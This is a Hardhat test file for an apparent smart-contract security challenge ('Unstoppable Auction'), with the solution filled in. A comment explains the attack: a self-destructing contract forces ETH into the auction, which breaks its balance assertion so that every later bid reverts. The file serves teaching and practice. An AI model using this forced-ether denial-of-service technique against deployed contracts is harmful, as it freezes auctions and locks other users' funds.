const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('[UNSTOPPABLE AUCTION EXPLOIT]', async function () {
    let deployer, attacker;

    const INITIAL_BID = ethers.utils.parseEther('10');

    before(async function () {
        // SET UP
        ;[deployer, attacker, alice, bob] = await ethers.getSigners();

        this.auction = await (
            await ethers.getContractFactory('UnstoppableAuction', deployer)
        ).deploy('0', ethers.constants.MaxUint256);

        await this.auction.connect(alice).bid({ value: INITIAL_BID });

        expect(
            await ethers.provider.getBalance(this.auction.address)
        ).to.be.equal(INITIAL_BID);
    });

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE
        /* 
        This exploit is about pushing ETH into the auction without
        allowing the bid to throw an error and revert.  
        
        The exploit contract is passed the address of the auction 
        contract on creation and has a single function "attack" which 
        self destructs and sends all ETH to the auction.
           
        This works because the _handle_bid function in the auction 
        asserts that it's own balance is the total deposited + the amount 
        being handled.  But this fails once we push ETH that's not meant 
        to be there as it no longer lines up.
        */
        this.exploit = await (
            await ethers.getContractFactory('UnstoppableAuctionExploit',
                attacker)).deploy(this.auction.address);
        await this.exploit.connect(attacker).attack({ value: INITIAL_BID });
    });

    after(async function () {
        // SUCCESS CONDITIONS
        await expect(
            this.auction.connect(bob).bid({ value: INITIAL_BID.add(ethers.utils.parseEther('1')) })
        ).to.be.revertedWith("invalid balance");
    });
});
